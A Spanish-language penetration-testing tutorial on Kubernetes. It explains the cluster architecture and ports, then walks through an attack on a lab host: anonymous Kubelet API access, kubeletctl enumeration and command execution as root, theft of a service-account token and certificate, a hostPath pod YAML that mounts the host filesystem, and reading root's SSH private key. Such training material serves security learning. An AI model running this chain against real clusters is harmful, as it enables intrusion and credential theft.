
# Kubernetes

## <mark style="color:purple;">Introducción</mark>

[Kubernetes](https://kubernetes.io/) , también conocido como `K8s`, se destaca como una tecnología revolucionaria que ha tenido un impacto significativo en el panorama del desarrollo de software. Esta plataforma ha transformado por completo el proceso de implementación y gestión de aplicaciones, brindando un enfoque más eficiente y optimizado. Al ofrecer una arquitectura de código abierto, Kubernetes ha sido diseñado específicamente para facilitar una implementación, escalado y gestión más rápidos y sencillos de los contenedores de aplicaciones.

Kubernetes, desarrollado por Google, aprovecha más de una década de experiencia en la ejecución de cargas de trabajo complejas. Como resultado, se ha convertido en una herramienta fundamental en el universo DevOps para la orquestación de microservicios. Desde su creación, Kubernetes ha sido donado a la [Cloud Native Computing Foundation](https://www.cncf.io/) , donde se ha convertido en el estándar de oro de la industria. Comprender los aspectos de seguridad de los contenedores K8 es crucial. Probablemente podamos acceder a uno de los muchos contenedores durante nuestra prueba de penetración.

Una de las características clave de Kubernetes es su adaptabilidad y compatibilidad con diversos entornos. Esta plataforma ofrece una amplia gama de funciones que permiten a los desarrolladores y administradores de sistemas configurar, automatizar y escalar fácilmente sus implementaciones y aplicaciones. Como resultado, Kubernetes se ha convertido en una solución de referencia para las organizaciones que buscan optimizar sus procesos de desarrollo y mejorar la eficiencia.

Kubernetes es un sistema de orquestación de contenedores que funciona ejecutando todas las aplicaciones en contenedores aislados del sistema host a través de `multiple layers of protection`. Este enfoque garantiza que las aplicaciones no se vean afectadas por los cambios en el sistema host, como actualizaciones o parches de seguridad. La arquitectura de K8s comprende una `master node`y `worker nodes`, cada una con funciones específicas.

***

## <mark style="color:purple;">Concepto K8s</mark>

Kubernetes gira en torno al concepto de pods, que pueden contener uno o más contenedores estrechamente conectados. Cada pod funciona como una máquina virtual independiente en un nodo, con su propia IP, nombre de host y otros detalles. Kubernetes simplifica la gestión de varios contenedores al ofrecer herramientas para el equilibrio de carga, el descubrimiento de servicios, la orquestación del almacenamiento, la autorreparación y más. A pesar de los desafíos en seguridad y gestión, K8s continúa creciendo y mejorando con funciones como `Role-Based Access Control`( `RBAC`), `Network Policies` y `Security Contexts`, que brindan un entorno más seguro para las aplicaciones.

#### Diferencias entre K8 y Docker

<table data-header-hidden><thead><tr><th width="165"></th><th></th><th></th></tr></thead><tbody><tr><td><strong>Función</strong></td><td><strong>Estibador</strong></td><td><strong>Kubernetes</strong></td></tr><tr><td><code>Primary</code></td><td>Plataforma para contenerizar aplicaciones</td><td>Una herramienta de orquestación para gestionar contenedores</td></tr><tr><td><code>Scaling</code></td><td>Escalado manual con Docker Swarm</td><td>Escalado automático</td></tr><tr><td><code>Networking</code></td><td>Red única</td><td>Red compleja con políticas</td></tr><tr><td><code>Storage</code></td><td>Volúmenes</td><td>Amplia gama de opciones de almacenamiento</td></tr></tbody></table>

La arquitectura de Kubernetes se divide principalmente en dos tipos de componentes:

* `Control Plane` (nodo maestro), que es responsable de controlar el clúster de Kubernetes
* `Worker Nodes` (minions), donde se ejecutan las aplicaciones en contenedores

## <mark style="color:purple;">**Nodos**</mark>

El nodo maestro aloja el Kubernetes `Control Plane`, que administra y coordina todas las actividades dentro del clúster y también garantiza que se mantenga el estado deseado del clúster. Por otro lado, los `Minions` ejecutan las aplicaciones reales y recibe instrucciones del plano de control y garantiza que se alcance el estado deseado.

Ofrece versatilidad para adaptarse a diversas necesidades, como soporte para bases de datos, cargas de trabajo de IA/ML y microservicios nativos de la nube. Además, es capaz de administrar aplicaciones de alto consumo de recursos en el borde y es compatible con diferentes plataformas. Por lo tanto, se puede utilizar en servicios de nube pública como Google Cloud, Azure y AWS o en centros de datos locales privados.

### **Plano de control**

El plano de control funciona como capa de gestión y consta de varios componentes cruciales, entre ellos:

| **Servicio**            | **Puertos TCP** |
| ----------------------- | --------------- |
| `etcd`                  | `2379`,`2380`   |
| `API server`            | `6443`          |
| `Scheduler`             | `10251`         |
| `Controller Manager`    | `10252`         |
| `Kubelet API`           | `10250`         |
| `Read-Only Kubelet API` | `10255`         |

Estos elementos permiten al `Control Plane` tomar decisiones y proporcionar una visión integral de todo el clúster.

### **Minions**

En un entorno de contenedores, los `Minions` funcionan como la ubicación designada para ejecutar aplicaciones. Es importante tener en cuenta que cada nodo está administrado y regulado por el plano de control, lo que ayuda a garantizar que todos los procesos que se ejecutan dentro de los contenedores funcionen de manera fluida y eficiente.

El `Scheduler`, basado en el `API server`, comprende el estado del clúster y programa nuevos pods en los nodos según corresponda. Después de decidir en qué nodo se debe ejecutar un pod, el servidor API actualiza el `etcd`.

Comprender cómo interactúan estos componentes es fundamental para comprender el funcionamiento de Kubernetes. El servidor API es el punto de entrada para todos los comandos administrativos, ya sea de los usuarios a través de kubectl o de los controladores. Este servidor se comunica con etcd para obtener o actualizar el estado del clúster.

### **Medidas de seguridad de K8**

La seguridad de Kubernetes se puede dividir en varios dominios:

* `Seguridad de la infraestructura del clúster`
* `Seguridad de la configuración del clúster`
* `Seguridad de la aplicación`
* `Seguridad de datos`

Cada dominio incluye múltiples capas y elementos que los desarrolladores y administradores deben proteger y gestionar adecuadamente.

***

## <mark style="color:purple;">API de Kubernetes</mark>

El núcleo de la arquitectura de Kubernetes es su API, que sirve como el principal punto de contacto para todas las interacciones internas y externas. La API de Kubernetes se ha diseñado para admitir el control declarativo, lo que permite a los usuarios definir el estado deseado para el sistema. Esto permite que Kubernetes tome las medidas necesarias para implementar el estado deseado.&#x20;

El `kube-apiserver` es responsable de alojar la API, que maneja y verifica las solicitudes RESTful para modificar el estado del sistema. Estas solicitudes pueden implicar la creación, modificación, eliminación y recuperación de información relacionada con varios recursos dentro del sistema. En general, la API de Kubernetes desempeña un papel crucial a la hora de facilitar la comunicación y el control sin problemas dentro del clúster de Kubernetes.

Dentro del marco de Kubernetes, un recurso de API funciona como un punto final que alberga una colección específica de objetos de API. Estos objetos pertenecen a una categoría particular e incluyen elementos esenciales como pods, servicios e implementaciones, entre otros. Cada recurso único viene equipado con un conjunto distinto de operaciones que se pueden ejecutar, que incluyen, entre otras:

<table data-header-hidden><thead><tr><th width="145"></th><th></th></tr></thead><tbody><tr><td><strong>Pedido</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>GET</code></td><td>Recupera información sobre un recurso o una lista de recursos.</td></tr><tr><td><code>POST</code></td><td>Crea un nuevo recurso.</td></tr><tr><td><code>PUT</code></td><td>Actualiza un recurso existente.</td></tr><tr><td><code>PATCH</code></td><td>Aplica actualizaciones parciales a un recurso.</td></tr><tr><td><code>DELETE</code></td><td>Elimina un recurso.</td></tr></tbody></table>

### **Autenticación**

En términos de autenticación, Kubernetes admite varios métodos, como certificados de cliente, tokens de portador, un proxy de autenticación o autenticación básica HTTP, que sirven para verificar la identidad del usuario. Una vez que el usuario ha sido autenticado, Kubernetes aplica las decisiones de autorización mediante el control de acceso basado en roles (Role-Based Access Control, `RBAC`). Esta técnica implica asignar roles específicos a usuarios o procesos con los permisos correspondientes para acceder y operar en los recursos. Por lo tanto, el proceso de autenticación y autorización de Kubernetes es una medida de seguridad integral que garantiza que solo los usuarios autorizados puedan acceder a los recursos y realizar operaciones.

En Kubernetes, se puede configurar `Kubelet` para permitir `acceso anónimo`. De forma predeterminada, Kubelet permite el acceso anónimo. Las solicitudes anónimas se consideran no autenticadas, lo que implica que cualquier solicitud realizada a Kubelet sin un certificado de cliente válido se tratará como anónima. Esto puede ser problemático ya que cualquier proceso o usuario que pueda acceder a la API de Kubelet puede realizar solicitudes y recibir respuestas, lo que podría exponer información confidencial o dar lugar a acciones no autorizadas.

**Interacción con el servidor API de K8**

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```

Por lo general `System:anonymous` representa un usuario no autenticado, lo que significa que no hemos proporcionado credenciales válidas o que estamos intentando acceder al servidor API de forma anónima. En este caso, intentamos acceder a la ruta raíz, lo que otorgaría un control significativo sobre el clúster de Kubernetes si se logra. De forma predeterminada, el acceso a la ruta raíz generalmente está restringido a usuarios autenticados y autorizados con privilegios administrativos y el servidor API rechazó la solicitud, respondiendo con un código de estado `403 Forbidden` en consecuencia.

### **API de Kubelet: Extracción de pods**

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"nginx\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:ports": {
					...SNIP...
```

La información que se muestra en la salida incluye los `names`, `namespaces`, `creation timestamps` y `container images` de los pods. También muestra los `last applied configuration` de cada pod, que pueden contener detalles confidenciales sobre las imágenes de los contenedores y sus políticas de extracción.

Comprender las imágenes de contenedores y sus versiones utilizadas en el clúster nos puede permitir identificar vulnerabilidades conocidas y explotarlas para obtener acceso no autorizado al sistema. La información del espacio de nombres puede brindar información sobre cómo se organizan los pods y los recursos dentro del clúster, que podemos usar para apuntar a espacios de nombres específicos con vulnerabilidades conocidas. También podemos usar metadatos como `uid` y `resourceVersion` para realizar reconocimientos y reconocer objetivos potenciales para futuros ataques. Revelar la última configuración aplicada puede exponer potencialmente información confidencial, como contraseñas, secretos o tokens de API, utilizados durante la implementación de los pods.

### **Kubeletctl - Extracción de pods**

Podemos analizar más a fondo los pods con el siguiente comando:

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
```

### **API de Kubelet: comandos disponibles**

Para interactuar de manera eficaz con los pods dentro del entorno de Kubernetes, es importante comprender claramente los comandos disponibles. Un enfoque que puede resultar especialmente útil es utilizar el comando `scan rce` en `kubeletctl`. Este comando proporciona información valiosa y permite una gestión eficiente de los pods.

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
```

### **API de Kubelet: Ejecución de comandos**

También podemos interactuar con un contenedor de forma interactiva y obtener información sobre el alcance de nuestros privilegios dentro de él. Esto nos permite comprender mejor nuestro nivel de acceso y control sobre el contenido del contenedor.

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

El resultado del comando muestra que el usuario actual que ejecuta el comando `id` dentro del contenedor tiene privilegios de root. Esto indica que hemos obtenido acceso administrativo dentro del contenedor, lo que podría generar vulnerabilidades de escalada de privilegios. Si obtenemos acceso a un contenedor con privilegios de root, podemos realizar más acciones en el sistema host o en otros contenedores.

***

## <mark style="color:purple;">Escalada de privilegios</mark>

Para obtener mayores privilegios y acceder al sistema host, podemos utilizar una herramienta llamada [kubeletctl](https://github.com/cyberark/kubeletctl) para obtener los datos de la cuenta de servicio de Kubernetes `token` y `certificate`( `ca.crt`) del servidor. Para ello, debemos proporcionar la dirección IP del servidor, el espacio de nombres y el pod de destino. En caso de que obtengamos este token y certificado, podemos elevar nuestros privilegios aún más, movernos horizontalmente por todo el clúster o acceder a pods y recursos adicionales.

### **API de Kubelet: extracción de tokens**

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

### **API de Kubelet: extracción de certificados**

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

Ahora que tenemos tanto `token` y `certificate`, podemos verificar los derechos de acceso en el clúster de Kubernetes. Esto se usa comúnmente para auditoría y verificación para garantizar que los usuarios tengan el nivel correcto de acceso y no se les otorguen más privilegios de los que necesitan. Sin embargo, podemos usarlo para nuestros fines y podemos consultar a K8s si tenemos permiso para realizar diferentes acciones en varios recursos.

### **Lista de privilegios**

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Aquí podemos ver información muy importante. Además de los recursos selfsubject, podemos ver los pods `get`, `create` y `list`, que son los recursos que representan el contenedor en ejecución en el clúster. A partir de aquí, podemos crear un archivo `YAML` que podemos usar para crear un nuevo contenedor y montar todo el sistema de archivos raíz desde el sistema host en el directorio `/root` de este contenedor. A partir de ahí, podemos acceder a los archivos y directorios de los sistemas host. El archivo `YAML` podría verse así:

#### **Pod YAML**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Una vez creado, ahora podemos crear el nuevo pod y verificar si se está ejecutando como se espera.

### **Creando un nuevo Pod**

```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

Si el pod se está ejecutando, podemos ejecutar el comando y podríamos generar un shell inverso o recuperar datos confidenciales como la clave SSH privada del usuario root.

### **Extraer la clave SSH de root**

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```
